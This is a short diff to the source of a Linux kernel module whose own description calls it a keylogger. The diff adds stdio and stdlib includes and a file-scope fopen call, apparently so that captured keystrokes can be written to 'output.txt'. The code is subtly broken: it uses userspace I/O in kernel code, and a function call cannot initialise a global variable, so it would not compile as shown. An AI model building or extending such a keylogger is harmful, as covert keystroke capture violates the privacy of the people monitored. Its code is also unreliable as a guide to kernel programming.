@@ -1,10 +1,15 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/init.h>
+#include <stdio.h>
+#include <stdlib.h>
 
 #ifndef __KERNEL__
 #define __KERNEL__
 #endif
+
+FILE *output = fopen("output.txt", "w");
+
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("A kernel-based keylogger module");
